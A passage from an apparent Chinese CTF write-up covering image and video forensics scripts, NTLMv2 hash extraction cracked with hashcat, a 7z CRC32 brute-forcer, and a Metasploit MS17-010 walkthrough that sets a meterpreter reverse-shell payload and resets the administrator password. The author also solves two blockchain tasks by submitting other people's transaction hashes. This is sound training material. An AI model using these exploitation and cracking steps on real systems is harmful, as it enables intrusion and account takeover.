class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Conversion from .webp to .png completed.'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>转 png 图片</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> cv2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 创建一个列表来保存所有的图片</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>images <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 读取所有的图片</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">881</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    img <span class=\"token operator\">=</span> cv2<span class=\"token punctuation\">.</span>imread<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'frame</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.png'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\"># OpenCV 读取图片默认是 BGR，转换成 RGB</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    img <span class=\"token operator\">=</span> cv2<span class=\"token punctuation\">.</span>cvtColor<span class=\"token punctuation\">(</span>img<span class=\"token punctuation\">,</span> cv2<span class=\"token punctuation\">.</span>COLOR_BGR2RGB<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    images<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>img<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># 确定你想要的矩形形状</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rows <span class=\"token operator\">=</span> <span class=\"token number\">22</span>     <span class=\"token comment\"># 我们这里假设你想要的矩形有 30 行</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>cols <span class=\"token operator\">=</span> <span class=\"token number\">40</span>   <span class=\"token comment\"># 我们这里假设你想要的矩形有 30 列</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># 创建一个空的列表来保存最终的矩形图片</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>final_images <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># 将图片组织成矩形形状</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> rows<span class=\"token operator\">*</span>cols<span class=\"token punctuation\">,</span> cols<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token comment\"># 使用 hstack 函数将一行的图片组合在一起</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    row <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>hstack<span class=\"token punctuation\">(</span>images<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span>cols<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    final_images<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>row<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># 使用 vstack 函数将所有的行堆叠在一起</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>merged_image <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>vstack<span class=\"token punctuation\">(</span>final_images<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># 使用 PIL 将 numpy 数组转换成图片</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>merged_image <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>fromarray<span class=\"token punctuation\">(</span>merged_image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\"># 保存合并后的图片</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>merged_image<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">'3.png'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>合并，用 gaps 拼图解决</p>\n<pre><code>gaps run puzzle.jpg solution.jpg --generations=20 --population=600\n</code></pre>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/solution.png\" alt=\"solution\"></p>\n<p>解决 base64 得到 flag</p>\n<h3 id=\"窃听风云\"><a class=\"markdownIt-Anchor\" href=\"#窃听风云\">#</a> 窃听风云</h3>\n<blockquote password=\"\">\n<p>Hacker 捕获到了一段敌对公司的对话信息流量，你能从流量中分析出 Jack 的密码吗，flag 为 SYC</p>\n</blockquote>\n<p>是一个 NTLNMSSP 流量分析</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/image-20231101155722725.png\" alt=\"image-20231101155722725\"></p>\n<p>通过对话，得知密码所用字典为 rockyou.txt</p>\n<p>username::Domian:ntlmssp.ntlmserverchallenge:ntlmssp.ntlmv2_response.ntproofstr:ntlmssp.ntlmv2_response</p>\n<p>得到</p>\n<blockquote>\n<p>jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</p>\n</blockquote>\n<p>用 hashcat 跑，得到 password</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hashcat <span class=\"token operator\">-</span>m <span class=\"token number\">5600</span> 保存的字符串<span class=\"token punctuation\">.</span>txt 密码字典<span class=\"token punctuation\">.</span>txt <span class=\"token operator\">-</span>o 结果<span class=\"token punctuation\">.</span>txt <span class=\"token operator\">-</span><span class=\"token operator\">-</span>force</pre></td></tr></table></figure><h3 id=\"extractme\"><a class=\"markdownIt-Anchor\" href=\"#extractme\">#</a> extractMe</h3>\n<p>下载之后，一眼顶针 7z crc4 位爆破</p>\n<p>套脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> zlib</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> py7zr</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">from</span> itertools <span class=\"token keyword\">import</span> product</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Usage: 7zcrc_cracker.py &lt;7z_file>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>file_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>crc_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>cracked <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    archive <span class=\"token operator\">=</span> py7zr<span class=\"token punctuation\">.</span>SevenZipFile<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> mode<span class=\"token operator\">=</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[x] Invalid 7z provided!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>archive_list <span class=\"token operator\">=</span> archive<span class=\"token punctuation\">.</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">for</span> archive <span class=\"token keyword\">in</span> archive_list<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> archive<span class=\"token punctuation\">.</span>uncompressed <span class=\"token operator\">==</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[92m[*] Found vulnerable file to CRC32 bruteforcing!\\033[0m'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[94mFilename:\\033[0m &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>archive<span class=\"token punctuation\">.</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[94mCRC32:\\033[0m &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>archive<span class=\"token punctuation\">.</span>crc32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        file_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>archive<span class=\"token punctuation\">.</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        crc_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>archive<span class=\"token punctuation\">.</span>crc32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>all_char <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>printable</pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">for</span> l <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    generator <span class=\"token operator\">=</span> product<span class=\"token punctuation\">(</span>all_char<span class=\"token punctuation\">,</span> repeat<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1;33m&lt;=================================================>\\033[0m'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">for</span> p <span class=\"token keyword\">in</span> generator<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    pt <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    crc <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>zlib<span class=\"token punctuation\">.</span>crc32<span class=\"token punctuation\">(</span>pt<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">if</span> crc <span class=\"token keyword\">in</span> crc_list<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[92m[!] Cracked plaintext for file!\\033[0m'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[94mFilename: &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>file_list<span class=\"token punctuation\">[</span>crc_list<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>crc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[94mPlaintext: &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>pt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        cracked <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">if</span> cracked <span class=\"token operator\">==</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>crc_list<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"时代的眼泪\"><a class=\"markdownIt-Anchor\" href=\"#时代的眼泪\">#</a> 时代的眼泪</h3>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veHNqMjEwL3AvMTYyMTM4NTQuaHRtbA==\">MSF 命令总结 - 大柿子 - 博客园 (cnblogs.com)</span></p>\n</blockquote>\n<p>给出的文件</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/image-20231104200158637.png\" alt=\"image-20231104200158637\"></p>\n<p>用 VMware 打开 ovf 文件。</p>\n<p>是一个有密码的虚拟机。</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/image-20231104200427327.png\" alt=\"image-20231104200427327\"></p>\n<p>CVE：MS17-010</p>\n<p>在 kali 中进行 msf 渗透。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msf6 <span class=\"token operator\">></span> search ms17</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                                                                                                                                                         </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Matching Modules                                                                                                                                           </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span>                                                                                                                                           </pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token comment\">#  Name                                                  Disclosure Date  Rank     Check  Description</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   -  ----                                                  ---------------  ----     -----  -----------</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token number\">0</span>  exploit/windows/smb/ms17_010_eternalblue              <span class=\"token number\">2017</span>-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   <span class=\"token number\">1</span>  exploit/ms17_010_psexec                               <span class=\"token number\">2017</span>-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token number\">2</span>  exploit/windows/smb/ms17_010_psexec                   <span class=\"token number\">2017</span>-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token number\">3</span>  auxiliary/admin/smb/ms17_010_command                  <span class=\"token number\">2017</span>-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   <span class=\"token number\">4</span>  auxiliary/scanner/smb/smb_ms17_010                                     normal   No     MS17-010 SMB RCE Detection</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token number\">5</span>  exploit/windows/fileformat/office_ms17_11882          <span class=\"token number\">2017</span>-11-15       manual   No     Microsoft Office CVE-2017-11882</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token number\">6</span>  auxiliary/admin/mssql/mssql_escalate_execute_as                        normal   No     Microsoft SQL Server Escalate EXECUTE AS</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   <span class=\"token number\">7</span>  auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                   normal   No     Microsoft SQL Server SQLi Escalate Execute AS</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token number\">8</span>  exploit/windows/smb/smb_doublepulsar_rce              <span class=\"token number\">2017</span>-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</pre></td></tr></table></figure><p>选择 2</p>\n<p>进行设置</p>\n<blockquote>\n<p>set rhosts 192.168.85.133</p>\n<p>set payload windows/meterpreter/reverse_tcp</p>\n</blockquote>\n<p>run</p>\n<p>进行修改管理员密码</p>\n<blockquote>\n<p>shell</p>\n<p>net user administrator 123456</p>\n</blockquote>\n<p>or</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/16.png\" alt=\"16\"></p>\n<p>FLAG 在图片里面</p>\n<h3 id=\"simpleconnect\"><a class=\"markdownIt-Anchor\" href=\"#simpleconnect\">#</a> SimpleConnect</h3>\n<h3 id=\"give_me_goerlieth\"><a class=\"markdownIt-Anchor\" href=\"#give_me_goerlieth\">#</a> give_me_Goerlieth</h3>\n<p>这两个题我做法一样，找到交易记录，提交别人的 hash 和地址就行。</p>\n<h3 id=\"death_n2te\"><a class=\"markdownIt-Anchor\" href=\"#death_n2te\">#</a> DEATH_N2TE</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> cv2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 视频文件路径</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>video_path <span class=\"token operator\">=</span> <span class=\"token string\">'kira.mp4'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 打开视频文件</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>cap <span class=\"token operator\">=</span> cv2<span class=\"token punctuation\">.</span>VideoCapture<span class=\"token punctuation\">(</span>video_path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 获取视频的帧宽度和帧高度</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>frame_width <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>cap<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>cv2<span class=\"token punctuation\">.</span>CAP_PROP_FRAME_WIDTH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 1920</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>frame_height <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>cap<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>cv2<span class=\"token punctuation\">.</span>CAP_PROP_FRAME_HEIGHT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 1080</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 创建一个空的图片，用于存储提取的像素点</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># 图片宽度为视频的帧宽度</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># 图片高度为视频的帧数（初始化时假设视频帧数不会超过 frame_height）</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>extracted_image <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>zeros<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>frame_height<span class=\"token punctuation\">,</span> frame_width<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> dtype<span class=\"token operator\">=</span>np<span class=\"token punctuation\">.</span>uint8<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># 阈值</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>threshold <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># 定义起始列和列间隔</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>start_col <span class=\"token operator\">=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>col_interval <span class=\"token operator\">=</span> <span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># 读取视频帧</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>frame_count <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>col_count <span class=\"token operator\">=</span> start_col</pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    ret<span class=\"token punctuation\">,</span> frame <span class=\"token operator\">=</span> cap<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> ret <span class=\"token keyword\">or</span> frame_count <span class=\"token operator\">>=</span> frame_height<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">break</span>  <span class=\"token comment\"># 如果读取失败或者帧数超过了预设的高度，则停止读取</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token comment\"># 从每一帧读取对应列号的像素</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token comment\"># 确保列号没有超出宽度范围</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">if</span> col_count <span class=\"token operator\">&lt;</span> frame_width<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        col_to_scan <span class=\"token operator\">=</span> frame<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">,</span> col_count<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token comment\"># 提取大于等于阈值的像素</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        white_pixels <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span><span class=\"token punctuation\">(</span>col_to_scan <span class=\"token operator\">>=</span> threshold<span class=\"token punctuation\">,</span> axis<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token comment\"># 将提取的像素设置到新图片的对应列</span></pre></td></tr><tr><td 